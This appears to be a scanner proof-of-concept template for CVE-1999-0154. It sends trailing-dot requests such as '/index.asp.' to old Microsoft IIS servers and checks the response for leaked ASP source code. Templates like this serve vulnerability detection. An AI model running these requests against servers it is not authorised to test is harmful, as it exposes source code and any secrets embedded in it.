[info]
id = "POC-AVE-1999-0007"
name = "Microsoft IIS 2.0/3.0 ASP 源码泄露漏洞 PoC"
author = "AVE"
severity = "medium"
tags = ["iis", "asp", "information-disclosure", "source-code-disclosure"]
description = "IIS 2.0 和 3.0 存在 ASP 源码泄露漏洞，远程攻击者通过在 URL 末尾添加点号（.）可读取 ASP 文件源代码。"
vuln_id = ["CVE-1999-0154", "AVE-1999-0007"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/index.asp."
headers = [
  { key = "User-Agent", value = "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0)" }
]

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["<%", "Language=", "Response.", "Server.", "Request."]
expect = true

[[poc.requests]]
method = "GET"
path = "/default.asp."
headers = [
  { key = "User-Agent", value = "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0)" }
]

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["<%", "Language=", "Response.", "Server.", "Request."]
expect = true
